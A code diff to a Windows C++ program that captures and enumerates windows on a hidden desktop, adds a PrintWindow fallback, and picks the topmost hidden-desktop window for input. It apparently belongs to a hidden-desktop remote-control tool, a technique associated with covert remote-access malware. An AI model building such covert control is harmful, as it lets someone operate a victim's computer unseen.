@@ -795,11 +795,17 @@ static void capture_loop() {
         DWORD enumInterval = staticFrames > 30 ? 1000 : 350;
         if (windows.empty() || forceFullFrame || now - lastWindowEnum >= enumInterval) {
             windows.clear();
-            HWND hwnd = GetWindow(GetDesktopWindow(), GW_CHILD);
-            while (hwnd) {
-                if (IsWindowVisible(hwnd) && !IsIconic(hwnd)) windows.push_back(hwnd);
-                hwnd = GetWindow(hwnd, GW_HWNDNEXT);
-            }
+            struct EnumParam {
+                vector<HWND>* list;
+            } param = { &windows };
+            auto EnumCallback = [](HWND hwnd, LPARAM lParam) -> BOOL {
+                auto p = reinterpret_cast<EnumParam*>(lParam);
+                if (IsWindowVisible(hwnd) && !IsIconic(hwnd)) {
+                    p->list->push_back(hwnd);
+                }
+                return TRUE;
+            };
+            EnumDesktopWindows(g_hHiddenDesktop, EnumCallback, reinterpret_cast<LPARAM>(&param));
             reverse(windows.begin(), windows.end());
             lastWindowEnum = now;
         }
@@ -829,7 +835,11 @@ static void capture_loop() {
             }
 
             PatBlt(hdcWin, 0, 0, ww, wh, BLACKNESS);
-            if (!PrintWindow(h, hdcWin, printFlags)) {
+            bool printSuccess = PrintWindow(h, hdcWin, printFlags);
+            if (!printSuccess) {
+                printSuccess = PrintWindow(h, hdcWin, 0);
+            }
+            if (!printSuccess) {
                 HDC hdcRealWin = GetWindowDC(h);
                 if (hdcRealWin) {
                     BitBlt(hdcWin, 0, 0, ww, wh, hdcRealWin, 0, 0, SRCCOPY);
@@ -1081,10 +1091,37 @@ static void activate_target_window(HWND hwnd, UINT msg, LRESULT ht) {
 }
 
 // -----------------------------------------------------------------------
+//  Topmost desktop window helpers
+// -----------------------------------------------------------------------
+static BOOL CALLBACK TopmostEnumProc(HWND hwnd, LPARAM lParam) {
+    HWND* pResult = reinterpret_cast<HWND*>(lParam);
+    if (IsWindowVisible(hwnd) && !IsIconic(hwnd)) {
+        wchar_t className[256];
+        if (GetClassNameW(hwnd, className, 256)) {
+            // Skip the standard desktop manager and taskbar windows
+            if (wcscmp(className, L"Progman") != 0 &&
+                wcscmp(className, L"Shell_TrayWnd") != 0 &&
+                wcscmp(className, L"Button") != 0) {
+                *pResult = hwnd;
+                return FALSE; // Stop enumerating, found topmost
+            }
+        }
+    }
+    return TRUE;
+}
+
+static HWND GetTopmostDesktopWindow() {
+    HWND topmost = NULL;
+    EnumDesktopWindows(g_hHiddenDesktop, TopmostEnumProc, reinterpret_cast<LPARAM>(&topmost));
+    return topmost;
+}
+
+// -----------------------------------------------------------------------
 //  Yardımcı: Odaklanmış pencereyi bul (gizli desktop'ta)
 // -----------------------------------------------------------------------
 static HWND GetFocusedWindow() {
     HWND hTarget = g_hCurrentFocus;
+    if (!hTarget || !IsWindow(hTarget)) hTarget = GetTopmostDesktopWindow(); // Fallback to topmost window of hidden desktop
     if (!hTarget || !IsWindow(hTarget)) hTarget = GetForegroundWindow();
     if (!hTarget || !IsWindow(hTarget)) hTarget = g_hLastWindow;
     if (!hTarget || !IsWindow(hTarget)) return NULL;
